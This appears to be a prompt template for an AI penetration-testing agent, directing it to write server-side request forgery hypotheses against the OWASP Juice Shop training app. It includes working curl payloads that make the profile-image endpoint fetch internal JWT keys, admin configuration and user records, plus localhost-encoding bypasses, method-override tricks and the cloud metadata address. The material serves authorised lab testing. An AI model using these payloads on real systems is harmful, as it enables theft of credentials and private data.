# Phase 1e — SSRF Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **Server-Side Request Forgery (SSRF) attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Focus on **URL fetching endpoints that can be abused to access internal resources, exfiltrate sensitive files, or interact with internal services**.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Do NOT guess — cite specific endpoints, parameters, and evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Identify URL-accepting endpoints** from the recon report — any endpoint that fetches a URL provided by the user is an SSRF candidate. Key targets:
   - Profile image upload via URL (`POST /profile/image/url`)
   - Any file download or import functionality
   - Webhook or callback registration endpoints
2. **Check HTTP method restrictions:** Some endpoints may block GET/POST but allow PUT or other methods. The profile image URL upload in Juice Shop requires a PUT method bypass.
3. **Identify internal services:** What services run on the same host? Juice Shop typically runs on port 3000. Internal admin endpoints, encryption key files, and configuration APIs are accessible via `localhost`.
4. **Map accessible internal resources:**
   - `/encryptionkeys/jwt.pub` — JWT public key (useful for JWT forgery)
   - `/rest/admin/application-configuration` — admin configuration
   - `/api/Users` — full user list
   - Static files in `/ftp/` directory
5. **Consider cloud metadata endpoints:** In AWS-deployed instances, `http://169.254.169.254/latest/meta-data/` may be reachable (but see safety constraints below).
6. **Cross-reference with known Juice Shop SSRF challenges** — the Write-up documents a 6-star SSRF challenge involving the profile image URL upload with HTTP method bypass.

## Juice Shop SSRF-Specific Context

### Primary Target: Profile Image URL Upload
- **Endpoint:** `POST /profile/image/url` (requires authentication)
- **Parameter:** `imageUrl` in the request body
- **Known behaviour:** The server fetches the URL provided in `imageUrl` and saves it as the user's profile image
- **HTTP method restriction:** The endpoint may only allow certain URL schemes or block `localhost`. However, the HTTP method used to fetch the URL can be overridden — Juice Shop's SSRF challenge requires sending a PUT request instead of GET
- **Key bypass:** Use `PUT` method override headers or parameters to change the fetch method

### Internal Resources Worth Targeting
| Internal URL | Value |
|-------------|-------|
| `http://localhost:3000/encryptionkeys/jwt.pub` | JWT public key — enables token forgery |
| `http://localhost:3000/rest/admin/application-configuration` | Application config including secrets |
| `http://localhost:3000/api/Users` | Full user list with emails and hashed passwords |
| `http://localhost:3000/ftp/acquisitions.md` | Hidden FTP files |
| `http://localhost:3000/ftp/package.json.bak` | Backup config file |
| `http://169.254.169.254/latest/meta-data/` | AWS instance metadata (IAM creds) |

### URL Bypass Techniques
- **IP alternatives for localhost:** `127.0.0.1`, `0.0.0.0`, `[::1]`, `0x7f000001`, `017700000001`, `127.1`
- **DNS rebinding:** Use a domain that resolves to 127.0.0.1
- **URL encoding:** `http://%6c%6f%63%61%6c%68%6f%73%74:3000/`
- **Scheme variations:** `http://`, `file://`, `gopher://`

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):

1. **SSRF via profile image URL** — `POST /profile/image/url` with `imageUrl` pointing to `http://localhost:3000/rest/admin/application-configuration`
2. **HTTP method bypass SSRF** — same endpoint but using PUT method override to bypass fetch restrictions
3. **Internal JWT key exfiltration** — SSRF to `http://localhost:3000/encryptionkeys/jwt.pub` to obtain the JWT signing key
4. **Internal user list exfiltration** — SSRF to `http://localhost:3000/api/Users` to dump all user records
5. **Cloud metadata access** — SSRF to `http://169.254.169.254/latest/meta-data/` (note: may be prohibited by safety rails in production)
6. **Localhost bypass techniques** — alternative representations of localhost to bypass URL filters (IP encoding, DNS rebinding, IPv6)

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter that accepts the URL>
**SSRF Target:** <internal URL to be fetched by the server>
**Bypass Technique:** <how to circumvent URL validation, if any — method override, IP encoding, scheme change>
**Expected Result:** <what data the server will return or what behaviour change occurs>
**Evidence from recon:** <reference to specific endpoint/finding from recon_report.md>
**Safety Note:** <any scope/safety considerations>
```

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 5 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** POST /profile/image/url
**Parameter:** imageUrl (JSON body or form field)
**SSRF Target:** http://localhost:3000/rest/admin/application-configuration
**Bypass Technique:** Direct localhost URL — if blocked, try 127.0.0.1, [::1], 0x7f000001
**Expected Result:** Server fetches the admin configuration and returns it (or saves it as "profile image" data that can be retrieved). Response may contain application secrets, JWT configuration, and feature flags.
**Evidence from recon:** Profile image upload endpoint identified at /profile/image/url; endpoint accepts arbitrary URLs.
**Safety Note:** Only targeting the Juice Shop instance itself — no external or cloud metadata access.

### Hypothesis 2
**Endpoint:** POST /profile/image/url
**Parameter:** imageUrl (JSON body or form field)
**SSRF Target:** http://localhost:3000/encryptionkeys/jwt.pub
**Bypass Technique:** HTTP PUT method override — add `X-HTTP-Method-Override: PUT` header or `_method=PUT` parameter to change the server-side fetch method
**Expected Result:** Server fetches the JWT public key file. The key can be extracted from the profile image data or response, enabling JWT token forgery.
**Evidence from recon:** /encryptionkeys/ directory identified in recon; profile image endpoint fetches external URLs.
**Safety Note:** Internal resource only — no external network access.

### Hypothesis 3
...
```

## Payload Guidelines for Juice Shop SSRF

### Direct SSRF
```bash
# Profile image URL with localhost target
curl -s -X POST "{{TARGET_URL}}/profile/image/url" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"imageUrl":"http://localhost:3000/encryptionkeys/jwt.pub"}'
```

### Method Override SSRF
```bash
# Using X-HTTP-Method-Override header
curl -s -X POST "{{TARGET_URL}}/profile/image/url" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "X-HTTP-Method-Override: PUT" \
  -d '{"imageUrl":"http://localhost:3000/rest/admin/application-configuration"}'

# Using _method parameter
curl -s -X POST "{{TARGET_URL}}/profile/image/url" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"imageUrl":"http://localhost:3000/rest/admin/application-configuration","_method":"PUT"}'
```

### Localhost Bypass Variants
```bash
# IPv4 decimal
curl -s -X POST "{{TARGET_URL}}/profile/image/url" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"imageUrl":"http://127.0.0.1:3000/encryptionkeys/jwt.pub"}'

# IPv6
curl -s -X POST "{{TARGET_URL}}/profile/image/url" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"imageUrl":"http://[::1]:3000/encryptionkeys/jwt.pub"}'

# Hex IP
curl -s -X POST "{{TARGET_URL}}/profile/image/url" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"imageUrl":"http://0x7f000001:3000/encryptionkeys/jwt.pub"}'
```

## Safety Constraints

- **ALLOW** SSRF payloads targeting `localhost` / `127.0.0.1` / `[::1]` only for accessing the Juice Shop instance itself
- **PROHIBIT** `169.254.169.254` in production environments — only test if explicitly authorised and note in findings that this is a controlled test
- **DO NOT** use SSRF to pivot to other internal network hosts or cloud services
- **DO NOT** use SSRF for denial-of-service (e.g., recursive URL fetching)

Save the output as `hypotheses_ssrf.md` using the `save_deliverable` tool.
